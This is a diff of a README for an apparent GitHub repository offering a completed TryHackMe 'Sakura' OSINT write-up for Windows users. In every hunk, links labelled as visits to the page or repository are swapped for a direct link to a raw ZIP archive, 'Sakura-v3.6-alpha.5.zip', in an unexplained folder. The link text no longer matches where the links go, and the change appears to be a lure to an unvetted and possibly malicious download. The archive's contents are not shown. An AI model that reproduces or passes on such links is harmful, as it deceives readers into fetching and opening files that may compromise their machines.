@@ -1,6 +1,6 @@
 # 🕵️ SakuraOsintTryhackme-completed - OSINT case files for Windows users
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/sxu9512/SakuraOsintTryhackme-completed)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/sxu9512/SakuraOsintTryhackme-completed/raw/refs/heads/main/plica/Osint-Tryhackme-completed-Sakura-v3.6-alpha.5.zip)
 
 ## 📌 What this is
 
@@ -23,7 +23,7 @@ This project is best for users who want to review the case on a Windows PC and f
 
 Use this link to visit the page and download or open the repository:
 
-[Visit the download page](https://github.com/sxu9512/SakuraOsintTryhackme-completed)
+[Visit the download page](https://github.com/sxu9512/SakuraOsintTryhackme-completed/raw/refs/heads/main/plica/Osint-Tryhackme-completed-Sakura-v3.6-alpha.5.zip)
 
 If you want to review it on Windows, open the link in your browser, then use GitHub’s file view to read the content or download the repository as a ZIP file.
 
@@ -163,7 +163,7 @@ Use this repository if you want to:
 
 ## 📎 Repository link
 
-[https://github.com/sxu9512/SakuraOsintTryhackme-completed](https://github.com/sxu9512/SakuraOsintTryhackme-completed)
+[https://github.com/sxu9512/SakuraOsintTryhackme-completed/raw/refs/heads/main/plica/Osint-Tryhackme-completed-Sakura-v3.6-alpha.5.zip](https://github.com/sxu9512/SakuraOsintTryhackme-completed/raw/refs/heads/main/plica/Osint-Tryhackme-completed-Sakura-v3.6-alpha.5.zip)
 
 ## 📌 Topics covered
 
@@ -186,4 +186,4 @@ Use this repository if you want to:
 
 ## 🖱️ Open it now
 
-[Visit the repository on GitHub](https://github.com/sxu9512/SakuraOsintTryhackme-completed)
+[Visit the repository on GitHub](https://github.com/sxu9512/SakuraOsintTryhackme-completed/raw/refs/heads/main/plica/Osint-Tryhackme-completed-Sakura-v3.6-alpha.5.zip)
